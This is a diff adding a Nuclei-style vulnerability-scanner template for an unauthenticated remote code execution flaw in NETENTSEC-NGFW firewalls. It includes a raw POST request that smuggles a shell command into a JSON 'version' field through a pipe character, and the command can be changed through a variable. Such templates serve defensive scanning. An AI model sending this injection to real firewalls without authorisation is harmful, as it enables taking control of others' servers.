@@ -1,0 +1,31 @@
+id: netentsec-ngfw-firewall-rce
+
+info:
+  name: NETENTSEC-NGFW Firewall RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    NETENTSEC-NGFW has an unauthorized RCE vulnerability. Attackers can use this vulnerability to execute code arbitrarily on the server side, write postscripts, obtain server permissions, and gain control of the entire web server.
+  tags: rce
+  reference:
+    - http://fofa.so
+
+variables:
+  cmd: "echo $(date +%s)"
+
+http:
+  - raw:
+      - |
+        POST /directdata/direct/router HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"action":"Liveupdate_Software","method":"getDownloadStatus","data":[{"4.2.0":{"version":"4.2.0|{{cmd}}"}}],"type":"rpc","tid":15}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "4.2.0"
+      - type: regex
+        regex:
+          - "\"percent\":\".*\""
